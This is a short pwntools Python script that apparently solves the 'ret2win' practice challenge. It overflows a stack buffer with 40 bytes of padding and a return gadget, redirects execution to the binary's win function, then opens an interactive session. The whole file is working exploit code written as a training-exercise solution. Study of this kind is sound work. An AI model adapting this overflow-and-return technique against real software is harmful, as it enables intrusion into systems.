#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('ret2win')

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

ret     = 0x00000000004006e7

pay = b'A' * 40
pay += p64(ret)
pay += p64(exe.sym.ret2win)

io = start()
io.clean()
io.sendline(pay)
io.interactive()

